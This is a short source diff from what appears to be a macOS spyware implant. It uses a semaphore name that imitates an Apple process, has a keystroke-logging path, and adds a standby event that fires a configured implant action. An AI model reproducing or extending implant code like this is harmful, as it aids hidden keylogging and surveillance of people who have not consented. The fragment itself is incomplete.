@@ -31,6 +31,7 @@
 
 #define SEM_NAME            "com.apple.mdworker_executed"
 #define GLOBAL_PERMISSIONS  0666
+
 //#define DEBUG
 
 // Used for the uspace<->kspace initialization
@@ -318,6 +319,18 @@ RCSISharedMemory  *mSharedMemoryLogging;
                     infoLog(ME, @"keystrokes logged correctly");
 #endif
                   }
+                
+                break;
+              }
+            case EVENT_STANDBY:
+              {
+#ifdef DEBUG
+                NSLog(@"%s: Event standby triggering action %d", __FUNCTION__, shMemLog->flag);
+#endif
+                 RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
+                
+                if (shMemLog->flag != CONF_ACTION_NULL)                   
+                  [taskManager triggerAction: shMemLog->flag];
                 
                 break;
               }
